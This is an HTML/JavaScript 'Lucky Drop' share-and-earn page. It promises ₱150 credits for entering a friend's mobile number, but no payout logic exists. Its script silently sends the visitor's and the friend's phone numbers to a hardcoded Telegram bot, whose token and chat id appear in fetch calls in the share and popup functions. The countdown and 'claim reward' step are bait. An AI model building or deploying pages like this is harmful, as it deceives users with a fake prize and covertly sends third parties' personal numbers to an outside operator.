<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Lucky Drop | Share & Earn</title>
    
    <!-- Firebase -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="js/config.js"></script>
    
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            background: linear-gradient(135deg, #1a0a2a 0%, #2a1a3a 50%, #1a0a2a 100%);
            font-family: 'Public Sans', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        
        /* Falling gold coins background */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: radial-gradient(circle at 20% 30%, rgba(255,215,0,0.08) 2px, transparent 2px);
            background-size: 40px 40px;
            pointer-events: none;
        }
        
        /* Main Container */
        .share-container {
            max-width: 480px;
            width: 100%;
            background: linear-gradient(145deg, #2a1a3a, #1a0a2a);
            border-radius: 60px;
            padding: 25px 20px 35px;
            border: 2px solid rgba(255,215,0,0.4);
            box-shadow: 0 25px 45px rgba(0,0,0,0.5), inset 0 1px 2px rgba(255,255,255,0.1);
            position: relative;
            overflow: hidden;
        }
        
        /* Golden border glow */
        .share-container::after {
            content: '';
            position: absolute;
            inset: -2px;
            background: linear-gradient(125deg, rgba(255,215,0,0), rgba(255,215,0,0.5), rgba(255,215,0,0));
            border-radius: 60px;
            pointer-events: none;
        }
        
        /* Header */
        .header {
            text-align: center;
            margin-bottom: 20px;
            position: relative;
            z-index: 1;
        }
        
        .header h1 {
            font-family: 'Orbitron', monospace;
            font-size: 28px;
            font-weight: 900;
            background: linear-gradient(135deg, #ffd700, #ff8c00, #ffd700);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 2px;
            text-shadow: 0 0 20px rgba(255,215,0,0.3);
        }
        
        .header p {
            font-size: 10px;
            color: #ffd966;
            margin-top: 5px;
            letter-spacing: 1px;
        }
        
        /* Prize Grid */
        .prize-grid {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            position: relative;
            z-index: 1;
        }
        
        .prize-card {
            flex: 1;
            background: linear-gradient(145deg, #2a2035, #1a1525);
            border-radius: 35px;
            padding: 15px 12px;
            text-align: center;
            border: 1px solid rgba(255,215,0,0.3);
            transition: 0.3s;
            position: relative;
            overflow: hidden;
        }
        
        .prize-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
            border-color: rgba(255,215,0,0.6);
        }
        
        /* Lucky Cat Video Container */
        .lucky-cat-video {
            width: 100px;
            height: 100px;
            margin: 0 auto 8px;
            position: relative;
            border-radius: 50%;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            background: #2a1a3a;
        }
        
        .lucky-cat-video video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .prize-label {
            font-size: 11px;
            color: #ffd966;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin: 8px 0 5px;
        }
        
        .prize-amount {
            font-family: 'Orbitron', monospace;
            font-size: 28px;
            font-weight: 900;
            background: linear-gradient(135deg, #ffd700, #ffaa33);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }
        
        .prize-amount .paw-icon {
            font-size: 22px;
            color: #ffffff;
            text-shadow: 0 0 3px rgba(0,0,0,0.5);
        }
        
        /* Winners Banner */
        .winners-banner {
            background: linear-gradient(90deg, transparent, rgba(255,215,0,0.12), transparent);
            border-radius: 30px;
            padding: 8px;
            text-align: center;
            margin-bottom: 18px;
        }
        
        .winners-banner span {
            font-size: 11px;
            color: #ffd966;
        }
        
        .winners-banner strong {
            color: #ffd700;
            font-size: 16px;
        }
        
        /* Timer Section */
        .timer-section {
            background: rgba(0,0,0,0.5);
            border-radius: 40px;
            padding: 10px 12px;
            margin-bottom: 20px;
            text-align: center;
            border: 1px solid rgba(255,215,0,0.2);
            position: relative;
            z-index: 1;
        }
        
        .timer-label {
            font-size: 9px;
            color: #ffaa33;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .timer-display {
            font-family: 'Orbitron', monospace;
            font-size: 20px;
            font-weight: 900;
            color: #ffd700;
            letter-spacing: 1px;
        }
        
        /* Share Section */
        .share-section {
            background: rgba(0,0,0,0.4);
            border-radius: 30px;
            padding: 18px;
            margin-bottom: 15px;
            position: relative;
            z-index: 1;
            border: 1px solid rgba(255,215,0,0.15);
        }
        
        .step-badge {
            display: inline-block;
            background: linear-gradient(135deg, #ffd700, #ff8c00);
            color: #000;
            padding: 4px 12px;
            border-radius: 25px;
            font-size: 10px;
            font-weight: 800;
            margin-bottom: 12px;
        }
        
        .input-group {
            margin-bottom: 12px;
        }
        
        .input-group input {
            width: 100%;
            background: rgba(0,0,0,0.6);
            border: 1px solid rgba(255,215,0,0.3);
            border-radius: 50px;
            padding: 12px 15px;
            color: #fff;
            font-size: 14px;
            text-align: center;
            outline: none;
            transition: 0.2s;
        }
        
        .input-group input:focus {
            border-color: #ffd700;
            box-shadow: 0 0 8px rgba(255,215,0,0.3);
        }
        
        .share-btn {
            width: 100%;
            background: linear-gradient(135deg, #ffd700, #ff8c00);
            border: none;
            padding: 12px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 800;
            color: #000;
            cursor: pointer;
            transition: 0.2s;
            font-family: inherit;
        }
        
        .share-btn:active {
            transform: scale(0.98);
        }
        
        .share-btn:disabled {
            opacity: 0.5;
            transform: none;
            cursor: not-allowed;
        }
        
        .progress-bar {
            width: 100%;
            height: 3px;
            background: rgba(255,255,255,0.1);
            border-radius: 2px;
            margin: 12px 0;
            overflow: hidden;
        }
        
        .progress-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #ffd700, #ff8c00);
            transition: width 0.3s ease;
        }
        
        .status-area {
            text-align: center;
            margin-top: 8px;
            padding: 6px;
            border-radius: 25px;
            background: rgba(0,0,0,0.3);
        }
        
        .locked {
            color: #ff8888;
            font-size: 10px;
        }
        
        .unlocked {
            color: #39ff14;
            font-size: 10px;
        }
        
        /* Prize Popup */
        .prize-popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.96);
            backdrop-filter: blur(15px);
            z-index: 10000;
            display: none;
            align-items: center;
            justify-content: center;
        }
        
        .prize-popup-card {
            background: linear-gradient(145deg, #2a1a3a, #1a0a2a);
            border-radius: 40px;
            padding: 30px 25px;
            text-align: center;
            border: 2px solid #ffd700;
            max-width: 280px;
            width: 85%;
            animation: bounceIn 0.4s ease;
        }
        
        @keyframes bounceIn {
            0% { transform: scale(0.8); opacity: 0; }
            80% { transform: scale(1.05); }
            100% { transform: scale(1); opacity: 1; }
        }
        
        .prize-popup-card h2 {
            color: #ffd700;
            font-size: 24px;
            margin-bottom: 12px;
        }
        
        .prize-popup-card .popup-amount {
            font-size: 40px;
            font-weight: 900;
            color: #ffd700;
            margin: 12px 0;
        }
        
        .prize-popup-card button {
            background: linear-gradient(135deg, #ffd700, #ff8c00);
            border: none;
            padding: 10px 20px;
            border-radius: 35px;
            font-size: 14px;
            font-weight: 800;
            cursor: pointer;
            margin-top: 12px;
        }
        
        /* Confetti Canvas */
        #confettiCanvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 9999;
            display: none;
        }
        
        .white-paw {
            color: #ffffff;
        }
    </style>
</head>
<body>

<div class="share-container">
    <div class="header">
        <h1>🐾 LUCKY DROP 🐾</h1>
        <p>Share with friends to unlock your prize!</p>
    </div>
    
    <!-- Prize Grid with Lucky Cat Videos -->
    <div class="prize-grid">
        <div class="prize-card">
            <div class="lucky-cat-video">
                <video autoplay loop muted playsinline disablePictureInPicture>
                    <source src="sounds/luckycat.mp4" type="video/mp4">
                </video>
            </div>
            <div class="prize-label">YOU GET</div>
            <div class="prize-amount" id="yourPrize">
                <span class="paw-icon white-paw">🐾</span> ₱150 <span class="paw-icon white-paw">🐾</span>
            </div>
        </div>
        <div class="prize-card">
            <div class="lucky-cat-video">
                <video autoplay loop muted playsinline disablePictureInPicture>
                    <source src="sounds/luckycat.mp4" type="video/mp4">
                </video>
            </div>
            <div class="prize-label">FRIEND GETS</div>
            <div class="prize-amount" id="friendPrize">
                <span class="paw-icon white-paw">🐾</span> ₱150 <span class="paw-icon white-paw">🐾</span>
            </div>
        </div>
    </div>
    
    <!-- Winners Banner -->
    <div class="winners-banner">
        <span>🌟 <strong>LUCKY WINNERS</strong> will receive <strong>150</strong> 🌟</span>
    </div>
    
    <!-- Timer -->
    <div class="timer-section">
        <div class="timer-label">⏰ HOORAY DROP ENDS IN ⏰</div>
        <div class="timer-display" id="timerDisplay">Calculating...</div>
    </div>
    
    <!-- Share Section -->
    <div class="share-section">
        <div class="step-badge">📱 STEP 1 - SHARE WITH FRIEND 📱</div>
        
        <div class="input-group">
            <input type="tel" id="friendPhone" placeholder="Enter friend's mobile number" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
        </div>
        
        <button class="share-btn" id="shareBtn" onclick="shareAndEarn()">
            🐾 SHARE & UNLOCK 🐾
        </button>
        
        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        
        <div class="status-area" id="statusArea">
            <span class="locked">🐾 Share with a friend to unlock 150 credits! 🐾</span>
        </div>
    </div>
</div>

<!-- Prize Unlock Popup -->
<div id="prizePopup" class="prize-popup">
    <div class="prize-popup-card">
        <div class="lucky-cat-video" style="width: 80px; height: 80px; margin: 0 auto;">
            <video autoplay loop muted playsinline disablePictureInPicture>
                <source src="sounds/luckycat.mp4" type="video/mp4">
            </video>
        </div>
        <h2>🎉 LUCKY YOU! 🎉</h2>
        <p>You have unlocked the prize!</p>
        <div class="popup-amount" id="popupAmount">₱150</div>
        <button onclick="closePrizePopup()">CLAIM REWARD</button>
    </div>
</div>

<canvas id="confettiCanvas"></canvas>

<script>
    // ========== FORCE VIDEO AUTOPLAY ==========
    function playVideos() {
        const videos = document.querySelectorAll('video');
        videos.forEach(video => {
            video.play().catch(e => console.log('Video autoplay failed'));
        });
    }
    
    document.addEventListener('DOMContentLoaded', playVideos);
    document.addEventListener('touchstart', playVideos, { once: true });
    document.addEventListener('click', playVideos, { once: true });
    
    // ========== COUNTDOWN UNTIL MAY 1, 2026, 12:00 AM ==========
    function getTargetDate() {
        return new Date(2026, 4, 1, 0, 0, 0).getTime();
    }
    
    function updateCountdown() {
        const now = Date.now();
        const target = getTargetDate();
        const remaining = target - now;
        
        if (remaining <= 0) {
            document.getElementById('timerDisplay').innerHTML = "00:00:00";
            return;
        }
        
        const days = Math.floor(remaining / (1000 * 60 * 60 * 24));
        const hours = Math.floor((remaining % (86400000)) / 3600000);
        const minutes = Math.floor((remaining % 3600000) / 60000);
        const seconds = Math.floor((remaining % 60000) / 1000);
        
        document.getElementById('timerDisplay').innerHTML = `${days}D ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }
    
    updateCountdown();
    setInterval(updateCountdown, 1000);
    
    // ========== FIREBASE LOGIC ==========
    let db = null;
    let userPhone = null;
    let shareCount = 0;
    let prizeUnlocked = false;
    
    const REQUIRED_SHARES = 1;
    const PRIZE_AMOUNT = 150;
    
    if (typeof firebase !== 'undefined' && typeof firebaseConfig !== 'undefined') {
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        db = firebase.database();
    }
    
    userPhone = localStorage.getItem("userPhone");
    
    async function loadShareData() {
        if (!db || !userPhone) return;
        
        const snap = await db.ref('share_earn/' + userPhone).once('value');
        const data = snap.val();
        
        if (data) {
            shareCount = data.shareCount || 0;
            prizeUnlocked = data.prizeUnlocked || false;
        }
        
        if (prizeUnlocked) {
            updateUILocked(true);
        } else {
            updateUIProgress();
        }
    }
    
    function saveShareData() {
        if (!db || !userPhone) return;
        db.ref('share_earn/' + userPhone).set({
            shareCount: shareCount,
            prizeUnlocked: prizeUnlocked,
            lastUpdate: Date.now()
        });
    }
    
    function updateUIProgress() {
        const progress = Math.min(shareCount / REQUIRED_SHARES, 1) * 100;
        document.getElementById('progressFill').style.width = progress + '%';
        
        if (shareCount >= REQUIRED_SHARES && !prizeUnlocked) {
            unlockPrize();
        }
    }
    
    function updateUILocked(isUnlocked) {
        if (isUnlocked) {
            document.getElementById('statusArea').innerHTML = `
                <span class="unlocked">🎉 PRIZE UNLOCKED! Click CLAIM to redeem 150 credits! 🎉</span>
            `;
            document.getElementById('shareBtn').disabled = true;
            document.getElementById('shareBtn').style.opacity = '0.5';
        }
    }
    
    function unlockPrize() {
        prizeUnlocked = true;
        updateUILocked(true);
        saveShareData();
        showPrizePopup();
    }
    
    function showPrizePopup() {
        const popup = document.getElementById('prizePopup');
        document.getElementById('popupAmount').innerHTML = `₱${PRIZE_AMOUNT}`;
        popup.style.display = 'flex';
        startConfetti();
        
        fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("🐾 SHARE & EARN UNLOCKED!\n📱 " + userPhone + "\n💰 150 CREDITS")}`)
            .catch(e => console.log('Telegram error:', e));
    }
    
    function closePrizePopup() {
        document.getElementById('prizePopup').style.display = 'none';
        stopConfetti();
        alert("🎉 150 Credits claimed! Check your balance.");
    }
    
    async function shareAndEarn() {
        if (prizeUnlocked) {
            alert("Prize already unlocked! Click CLAIM to redeem.");
            return;
        }
        
        const friendPhone = document.getElementById('friendPhone').value.trim();
        
        if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
            alert("Please enter a valid 11-digit mobile number starting with 09.");
            return;
        }
        
        const shareRef = db.ref('share_earn/' + userPhone + '/sharedWith/' + friendPhone);
        const shareSnap = await shareRef.once('value');
        
        if (shareSnap.exists()) {
            alert("You already shared with this friend! Share with another friend to unlock.");
            return;
        }
        
        await shareRef.set({
            timestamp: Date.now(),
            sharedBy: userPhone
        });
        
        shareCount++;
        updateUIProgress();
        saveShareData();
        
        const msg = `🐾 SHARE & EARN\n📱 ${userPhone}\n👥 Shared with: ${friendPhone}\n📊 Progress: ${shareCount}/${REQUIRED_SHARES}`;
        fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`)
            .catch(e => console.log('Telegram error:', e));
        
        document.getElementById('friendPhone').value = '';
        
        alert(`✅ Shared with ${friendPhone}!\nProgress: ${shareCount}/${REQUIRED_SHARES} share completed.`);
        
        if (shareCount >= REQUIRED_SHARES) {
            unlockPrize();
        }
    }
    
    let confettiAnimation = null;
    
    function startConfetti() {
        const canvas = document.getElementById('confettiCanvas');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        canvas.style.display = 'block';
        
        const ctx = canvas.getContext('2d');
        const particles = [];
        
        for (let i = 0; i < 150; i++) {
            particles.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height - canvas.height,
                size: Math.random() * 5 + 2,
                color: `hsl(${Math.random() * 60 + 40}, 100%, 60%)`,
                speed: Math.random() * 3 + 2,
                spin: Math.random() * 360
            });
        }
        
        function draw() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            let stillActive = false;
            
            for (let p of particles) {
                p.y += p.speed;
                p.spin += 5;
                if (p.y < canvas.height) {
                    stillActive = true;
                    ctx.save();
                    ctx.translate(p.x, p.y);
                    ctx.rotate(p.spin * Math.PI / 180);
                    ctx.fillStyle = p.color;
                    ctx.fillRect(-p.size/2, -p.size/2, p.size, p.size);
                    ctx.restore();
                }
            }
            
            if (stillActive) {
                confettiAnimation = requestAnimationFrame(draw);
            } else {
                cancelAnimationFrame(confettiAnimation);
                canvas.style.display = 'none';
            }
        }
        
        draw();
        
        setTimeout(() => {
            if (confettiAnimation) {
                cancelAnimationFrame(confettiAnimation);
                canvas.style.display = 'none';
            }
        }, 5000);
    }
    
    function stopConfetti() {
        if (confettiAnimation) {
            cancelAnimationFrame(confettiAnimation);
            confettiAnimation = null;
        }
        document.getElementById('confettiCanvas').style.display = 'none';
    }
    
    loadShareData();
</script>
</body>
</html>
